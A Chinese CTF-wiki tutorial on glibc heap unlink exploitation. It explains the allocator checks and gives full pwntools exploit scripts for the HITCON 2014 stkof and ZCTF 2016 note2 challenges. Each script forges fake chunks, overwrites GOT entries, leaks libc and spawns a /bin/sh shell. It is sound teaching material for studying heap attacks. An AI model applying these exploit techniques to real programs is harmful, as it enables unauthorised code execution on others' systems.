---
typora-root-url: ..\..
---

# Unlink

## 原理

我们在利用 unlink 所造成的漏洞时，其实就是对进行 unlink chunk 进行内存布局，然后借助 unlink 操作来达成修改指针的效果。

我们先来简单回顾一下 unlink 的目的与过程，其目的是把一个双向链表中的空闲块拿出来，然后和目前物理相邻的 free chunk 进行合并。其基本的过程如下

![](/pwn/heap/figure/unlink_smallbin_intro.png)

下面我们首先介绍一下 unlink 最初没有防护时的利用方法，然后介绍目前利用 unlink 的方式。

### 古老的 unlink

在最初 unlink 实现的时候，其实是没有对双向链表检查的，也就是说，没有以下的代码。

```c
// 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
// fd bk
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
  
  // next_size related
              if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)              \
                || __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
              malloc_printerr (check_action,                                      \
                               "corrupted double-linked list (not small)",    \
                               P, AV);   
```
**这里我们以 32 位为例**，假设堆内存最初的布局是下面的样子

![](/pwn/heap/figure/old_unlink_vul.png)

那么如果我们通过某种方式（**比如溢出**）将 Nextchunk 的 fd 和 bk 指针修改为指定的值。则当我们free(Q)时

1.  glibc 判断这个块是 small chunk。
2.  判断前向合并，发现前一个 chunk 处于使用状态，不需要前向合并。
3.  判断后向合并，发现后一个 chunk 处于空闲状态，需要合并。
4.  继而对 nextchunk 采取 unlink 操作。

那么 unlink 具体执行的效果是什么样子呢？我们可以来分析一下

- FD=P->fd = target addr -12
- BK=P->bk = expect value
- FD->bk = BK，即 *(target addr-12+12)=BK=expect value
- BK->fd = FD，即*(expect value +8) = FD = target addr-12

**看起来我们似乎可以通过 unlink 直接实现任意地址读写的目的，但是我们还是需要确保 expect value +8 地址具有可写的权限。**

比如说我们将 target addr 设置为某个 got 表项，那么当程序调用对应的 libc 函数时，就会直接执行我们设置的值（expect value）处的代码。**需要注意的是，expect value+8 处的值被破坏了，需要想办法绕过。**

### 当前的 unlink

**但是，现实是残酷的。。**我们刚才考虑的是没有检查的情况，但是一旦加上检查，就没有这么简单了。我们看一下对 fd 和 bk 的检查

```c
// fd bk
if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
  malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
```

此时

- FD->bk = target addr - 12 + 12=target_addr
- BK->fd = expect value + 8

那么我们上面所利用的修改 GOT 表项的方法就可能不可用了。但是，如果我们使得 expect value+8 以及 target_addr 等于 P，那么我们就可以执行

- *P= expect value = P - 8
- *P = target addr -12 = P - 12

即改写了指针 P 的内容，将其指向了比自己低 12 的地址处。

而如果我们想要使得两者都指向 P，只需要安装如下方式修改即可

![](/pwn/heap/figure/new_unlink_vul.png)

我们会通过之后的例子来说明，我们这样的修改是可以达到一定的效果的。

需要注意的是，这里我们并没有违背下面的约束。

```c
    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
```

**此外，其实如果我们设置next chunk 的 fd 和 bk 均为 nextchunk 的地址也是可以绕过上面的检测的。但是这样的话，并不能达到修改指针内容的效果。**

## 2014 HITCON stkof

### 基本信息

```shell
➜  2014_hitcon_stkof git:(master) file stkof   
stkof: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4872b087443d1e52ce720d0a4007b1920f18e7b0, stripped
➜  2014_hitcon_stkof git:(master) checksec stkof        
[*] '/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/unlink/2014_hitcon_stkof/stkof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以看出，程序是 64 位的，主要开启了 Canary 和 NX 保护。

### 基本功能

程序几乎啥输出也没有，只能硬看了，大概是一个内存分配器，差不多有四个功能

- 1，分配指定大小的内存，并在bss段记录对应 chunk 的指针，假设其为global。
- 2，根据指定索引，以及指定大小向指定内存处，读入数据。**可见，这里存在堆溢出的情况，因为这里读入字节的大小是由我们来控制的。**
- 3，根据指定索引，释放已经分配的内存块。
- 4，这个功能并没有什么乱用，本来以为是可以输出内容，结果什么也没有输出。。

### 初步测试

值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。这里经过测试，会申请两个缓冲区，分别大小为1024 和 1024。具体如下，可以进行调试查看

初次调用 fgets 时，malloc会分配缓冲区 1024 大小。

```
*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd860 ◂— 0x16
*R8   0x1
*R9   0x0
*R10  0x7ffff7fd2700 ◂— 0x7ffff7fd2700
*R11  0x246
*R12  0xa
*R13  0x9
 R14  0x0
*R15  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RBP  0x7ffff7dd18e0 (_IO_2_1_stdin_) ◂— 0xfbad2288
*RSP  0x7fffffffd858 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 <malloc>        push   rbp <0x7ffff7dd18e0>
...，省略
 ► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a8769c _IO_file_underflow+508
   f 4     7ffff7a8860e _IO_default_uflow+14
   f 5     7ffff7a7bc6a _IO_getline_info+170
   f 6     7ffff7a7bd78
   f 7     7ffff7a7ab7d fgets+173
   f 8           400d2e
   f 9     7ffff7a2d830 __libc_start_main+240
```

分配之后，堆如下

```
pwndbg> heap
Top Chunk: 0xe05410
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05410 PREV_INUSE {
  prev_size = 0, 
  size = 134129, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

当分配16大小的内存后，堆布局如下

```
pwndbg> heap
Top Chunk: 0xe05430
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0xa3631, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x20bd1
}
0xe05430 PREV_INUSE {
  prev_size = 0, 
  size = 134097, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

当使用 printf 函数，会分配 1024 字节空间，如下

```
*RAX  0x0
*RBX  0x400
*RCX  0x7ffff7b03c34 (__fxstat64+20) ◂— cmp    rax, -0x1000 /* 'H=' */
*RDX  0x88
*RDI  0x400
*RSI  0x7fffffffd1c0 ◂— 0x16
 R8   0x0
*R9   0x0
*R10  0x0
*R11  0x246
*R12  0x1
*R13  0x7fffffffd827 ◂— 0x31 /* '1' */
 R14  0x0
*R15  0x400de4 ◂— and    eax, 0x2e000a64 /* '%d\n' */
*RBP  0x7ffff7dd2620 (_IO_2_1_stdout_) ◂— 0xfbad2284
*RSP  0x7fffffffd1b8 —▸ 0x7ffff7a7a1d5 (_IO_file_doallocate+85) ◂— mov    rsi, rax
*RIP  0x7ffff7a91130 (malloc) ◂— push   rbp
─────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────
 ► 0x7ffff7a91130 <malloc>       push   rbp <0x7ffff7dd2620>
。。。省略
► f 0     7ffff7a91130 malloc
   f 1     7ffff7a7a1d5 _IO_file_doallocate+85
   f 2     7ffff7a88594 _IO_doallocbuf+52
   f 3     7ffff7a878f8 _IO_file_overflow+456
   f 4     7ffff7a8628d _IO_file_xsputn+173
   f 5     7ffff7a5ae00 vfprintf+3216
   f 6     7ffff7a62899 printf+153
   f 7           4009cd
   f 8           400cb1
   f 9     7ffff7a2d830 __libc_start_main+240

```

堆布局如下

```
pwndbg> heap
Top Chunk: 0xe05840
Last Remainder: 0

0xe05000 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0xa3631, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05410 FASTBIN {
  prev_size = 0, 
  size = 33, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x411
}
0xe05430 PREV_INUSE {
  prev_size = 0, 
  size = 1041, 
  fd = 0xa4b4f, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0xe05840 PREV_INUSE {
  prev_size = 0, 
  size = 133057, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
```

此后，无论是输入输出都不会再申请缓冲去了。所以我们最好最初的申请一个 chunk 来把这些缓冲区给申请了，方便之后操作。

但是，比较有意思的是，如果我们是 attach 上去的话，第一个缓冲区分配的大小为 4096 大小。

```
pwndbg> heap
Top Chunk: 0x1e9b010
Last Remainder: 0

0x1e9a000 PREV_INUSE {
  prev_size = 0, 
  size = 4113, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}
0x1e9b010 PREV_INUSE {
  prev_size = 0, 
  size = 135153, 
  fd = 0x0, 
  bk = 0x0, 
  fd_nextsize = 0x0, 
  bk_nextsize = 0x0
}

```

### 基本思路

根据上面分析，我们在前面先分配一个 chunk 来把缓冲区分配完毕，以免影响之后的操作。

由于程序本身没有 leak，要想执行 system 等函数，我们的首要目的还是先构造 leak，基本思路如下

- 利用 unlink 修改 global[2] 为 &global[2]-0x18。
- 利用编辑功能修改 global[0] 为 free@got 地址，同时修改 global[1] 为puts@got 地址，global[2] 为 atoi@got 地址。
- 修改 `free@got` 为 `puts@plt` 的地址，从而当再次调用 `free` 函数时，即可直接调用 puts 函数。这样就可以泄漏函数内容。 
- free global[2]，即泄漏 puts@got 内容，从而知道 system 函数地址以及 libc 中 /bin/sh 地址。
- 修改 `atoi@got` 为 system 函数地址，再次调用时，输入 /bin/sh 地址即可。

代码如下

```python
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
if args['DEBUG']:
    context.log_level = 'debug'
context.binary = "./stkof"
stkof = ELF('./stkof')
if args['REMOTE']:
    p = remote('127.0.0.1', 7777)
else:
    p = process("./stkof")
log.info('PID: ' + str(proc.pidof(p)[0]))
libc = ELF('./libc.so.6')
head = 0x602140


def alloc(size):
    p.sendline('1')
    p.sendline(str(size))
    p.recvuntil('OK\n')


def edit(idx, size, content):
    p.sendline('2')
    p.sendline(str(idx))
    p.sendline(str(size))
    p.send(content)
    p.recvuntil('OK\n')


def free(idx):
    p.sendline('3')
    p.sendline(str(idx))


def exp():
    # trigger to malloc buffer for io function
    alloc(0x100)  # idx 1
    # begin 
    alloc(0x30)  # idx 2
    # small chunk size in order to trigger unlink
    alloc(0x80)  # idx 3
    # a fake chunk at global[2]=head+16 who's size is 0x20
    payload = p64(0)  #prev_size
    payload += p64(0x20)  #size
    payload += p64(head + 16 - 0x18)  #fd
    payload += p64(head + 16 - 0x10)  #bk
    payload += p64(0x20)  # next chunk's prev_size bypass the check
    payload = payload.ljust(0x30, 'a')
    # overwrite global[3]'s chunk's prev_size
    # make it believe that prev chunk is at global[2]
    payload += p64(0x30)
    # make it believe that prev chunk is free
    payload += p64(0x90)
    edit(2, len(payload), payload)
    # unlink fake chunk, so global[2] =&(global[2])-0x18=head-8
    free(3)
    p.recvuntil('OK\n')
    #gdb.attach(p)
    # overwrite global[0] = free@got, global[1]=puts@got, global[2]=atoi@got
    payload = 'a' * 8 + p64(stkof.got['free']) + p64(stkof.got['puts']) + p64(
        stkof.got['atoi'])
    edit(2, len(payload), payload)
    # edit free@got to puts@plt
    payload = p64(stkof.plt['puts'])
    edit(0, len(payload), payload)

    #free global[1] to leak puts addr
    free(1)
    puts_addr = p.recvuntil('\nOK\n', drop=True).ljust(8, '\x00')
    puts_addr = u64(puts_addr)
    log.success('puts addr: ' + hex(puts_addr))
    libc_base = puts_addr - libc.symbols['puts']
    binsh_addr = libc_base + next(libc.search('/bin/sh'))
    system_addr = libc_base + libc.symbols['system']
    log.success('libc base: ' + hex(libc_base))
    log.success('/bin/sh addr: ' + hex(binsh_addr))
    log.success('system addr: ' + hex(system_addr))
    # modify atoi@got to system addr
    payload = p64(system_addr)
    edit(2, len(payload), payload)
    p.send(p64(binsh_addr))
    p.interactive()


if __name__ == "__main__":
    exp()

```



## 2016 ZCTF note2

### 分析程序

首先，我们先分析一下程序，可以看出程序的主要功能为

- 添加note，size限制为0x80，size会被记录，note指针会被记录。
- 展示note内容。
- 编辑note内容，其中包括覆盖已有的note，在已有的note后面添加内容。
- 释放note。

仔细分析后，可以发现程序有以下几个问题

1. 在添加note时，程序会记录note对应的大小，该大小会用于控制读取note的内容，但是读取的循环变量i是无符号变量，所以比较时都会转换为无符号变量，那么当我们输入size为0时，glibc根据其规定，会分配0x20个字节，但是程序读取的内容却并不受到限制，故而会产生堆溢出。
2. 程序在每次编辑note时，都会申请0xa0大小的内存，但是在 free 之后并没有设置为NULL。

第一个问题对应在ida中的代码如下

```c
unsigned __int64 __fastcall ReadLenChar(__int64 a1, __int64 a2, char a3)
{
  char v4; // [sp+Ch] [bp-34h]@1
  char buf; // [sp+2Fh] [bp-11h]@2
  unsigned __int64 i; // [sp+30h] [bp-10h]@1
  __int64 v7; // [sp+38h] [bp-8h]@2

  v4 = a3;
  for ( i = 0LL; a2 - 1 > i; ++i )
  {
    v7 = read(0, &buf, 1uLL);
    if ( v7 <= 0 )
      exit(-1);
    if ( buf == v4 )
      break;
    *(_BYTE *)(i + a1) = buf;
  }
  *(_BYTE *)(a1 + i) = 0;
  return i;
}
```

其中i是unsigned类型，a2为int类型，所以两者在for循环相比较的时候，a2-1的结果-1会被视为unsigned类型，此时，即最大的整数。所以说可以读取任意长度的数据，这里也就是后面我们溢出所使用的办法。

### 基本思路

这里我们主要利用发现的第一个问题，主要利用了 fastbin 的机制、unlink 的机制。

下面依次进行讲解。

#### 基本操作

首先，我们先把note可能的基本操作列举出来。

```python
p = process('./note2')
note2 = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
context.log_level = 'debug'


def newnote(length, content):
    p.recvuntil('option--->>')
    p.sendline('1')
    p.recvuntil('(less than 128)')
    p.sendline(str(length))
    p.recvuntil('content:')
    p.sendline(content)


def shownote(id):
    p.recvuntil('option--->>')
    p.sendline('2')
    p.recvuntil('note:')
    p.sendline(str(id))


def editnote(id, choice, s):
    p.recvuntil('option--->>')
    p.sendline('3')
    p.recvuntil('note:')
    p.sendline(str(id))
    p.recvuntil('2.append]')
    p.sendline(str(choice))
    p.sendline(s)


def deletenote(id):
    p.recvuntil('option--->>')
    p.sendline('4')
    p.recvuntil('note:')
    p.sendline(str(id))
```

#### 生成三个note

这一部分对应的代码如下

```python
# chunk0: a fake chunk
ptr = 0x0000000000602120
fakefd = ptr - 0x18
fakebk = ptr - 0x10
content = 'a' * 8 + p64(0x61) + p64(fakefd) + p64(fakebk) + 'b' * 64 + p64(0x60)
#content = p64(fakefd) + p64(fakebk)
newnote(128, content)
# chunk1: a zero size chunk produce overwrite
newnote(0, 'a' * 8)
# chunk2: a chunk to be overwrited and freed
newnote(0x80, 'b' * 16)
```

其中这三个note的大小分别为0x80，0，0x80，第二个chunk虽然申请的大小为0，但是glibc的要求chunk块至少可以存储4个必要的字段(prev\_size,size,fd,bk)，所以会分配0x20的空间。同时，由于无符号整数的比较问题，可以为该note输入任意长的字符串。

这里需要注意的是，chunk1中一共构造了两个chunk

- chunk ptr[0]，这个是为了unlink时修改对应的值。
- chunk ptr[0]'s nextchunk，这个是为了使得unlink时的第一个检查满足。

```c
    // 由于P已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致。
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
```

当构造完三个 note 后，堆的基本构造如图1所示。

```
                                   +-----------------+ high addr
                                   |      ...        |
                                   +-----------------+
                                   |      'b'*8      |
                ptr[2]-----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------+------------
                                   |    unused       |
                                   +-----------------+
                                   |    'a'*8        |
                 ptr[1]----------> +-----------------+  chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------+-------------
                                   |    unused       |
                                   +-----------------+
                                   |  prev_size=0x60 |
fake ptr[0] chunk's nextchunk----->+-----------------+
                                   |    64*'a'       |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0x61         |  chunk 0
                                   +-----------------+
                                   |    'a *8        |
                 ptr[0]----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
                                           图1
```

#### 释放chunk1-覆盖chunk2-释放chunk2

对应的代码如下

```python
# edit the chunk1 to overwrite the chunk2
deletenote(1)
content = 'a' * 16 + p64(0xa0) + p64(0x90)
newnote(0, content)
# delete note 2 to trigger the unlink
# after unlink, ptr[0] = ptr - 0x18
deletenote(2)
```

首先释放 chunk1，由于该chunk属于fastbin，所以下次在申请的时候仍然会申请到该chunk，同时由于上面所说的类型问题，我们可以读取任意字符，所以就可以覆盖chunk3，覆盖之后如图2所示。

```
                                   +-----------------+high addr
                                   |      ...        |
                                   +-----------------+
                                   |   '\x00'+'b'*7  |
                ptr[2]-----------> +-----------------+ chunk 2
                                   |    size=0x90    |
                                   +-----------------+
                                   |    0xa0         |
                                   +-----------------+------------
                                   |    'a'*8        |
                                   +-----------------+
                                   |    'a'*8        |
                 ptr[1]----------> +-----------------+ chunk 1
                                   |    size=0x20    |
                                   +-----------------+
                                   |    prevsize     |
                                   +-----------------+-------------
                                   |    unused       |
                                   +-----------------+
                                   |  prev_size=0x60 |
fake ptr[0] chunk's nextchunk----->+-----------------+
                                   |    64*'a'       |
                                   +-----------------+
                                   |    fakebk       |
                                   +-----------------+
                                   |    fakefd       |
                                   +-----------------+
                                   |    0x61         |  chunk 0
                                   +-----------------+
                                   |    'a *8        |
                 ptr[0]----------> +-----------------+
                                   |    size=0x91    |
                                   +-----------------+
                                   |    prev_size    |
                                   +-----------------+  low addr
                                           图2
```

该覆盖主要是为了释放chunk2的时候可以后向合并（合并低地址），对chunk0中虚拟构造的chunk进行unlink。即将要执行的操作为unlink(ptr[0])，同时我们所构造的fakebk和fakefd满足如下约束

```c
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))                      \
```

unlink成功执行，会导致ptr[0]所存储的地址变为fakebk，即ptr-0x18。

#### 获取system地址

代码如下

```python
# overwrite the chunk0(which is ptr[0]) with got atoi
atoi_got = note2.got['atoi']
content = 'a' * 0x18 + p64(atoi_got)
editnote(0, 1, content)
# get the aoti addr
shownote(0)

sh.recvuntil('is ')
atoi_addr = sh.recvuntil('\n', drop=True)
print atoi_addr
atoi_addr = u64(atoi_addr.ljust(8, '\x00'))
print 'leak atoi addr: ' + hex(atoi_addr)

# get system addr
atoi_offest = libc.symbols['atoi']
libcbase = atoi_addr - atoi_offest
system_offest = libc.symbols['system']
system_addr = libcbase + system_offest

print 'leak system addr: ', hex(system_addr)
```

我们修改ptr[0]的内容为 ptr 的地址-0x18，所以当我们再次编辑 note0 时，可以覆盖ptr[0]的内容。这里我们将其覆盖为atoi的地址。
这样的话，如果我们查看note 0的内容，其实查看的就是atoi的地址。

之后我们根据 libc 中对应的偏移计算出 system 的地址。

#### 修改atoi got

```python
# overwrite the atoi got with systemaddr
content = p64(system_addr)
editnote(0, 1, content)
```

由于此时 ptr[0] 的地址 got 表的地址，所以我们可以直接修改该 note，覆盖为 system 地址。

#### get shell

```python
# get shell
sh.recvuntil('option--->>')
sh.sendline('/bin/sh')
sh.interactive()
```

此时如果我们再调用 atoi ，其实调用的就是 system 函数，所以就可以拿到shell了。

## 题目

- [Insomni'hack 2017-Wheel of Robots](https://gist.github.com/niklasb/074428333b817d2ecb63f7926074427a)
- [DEFCON 2017 Qualifiers beatmeonthedl](https://github.com/Owlz/CTF/raw/master/2017/DEFCON/beatmeonthedl/beatmeonthedl) 

## 参考

- malloc@angelboy


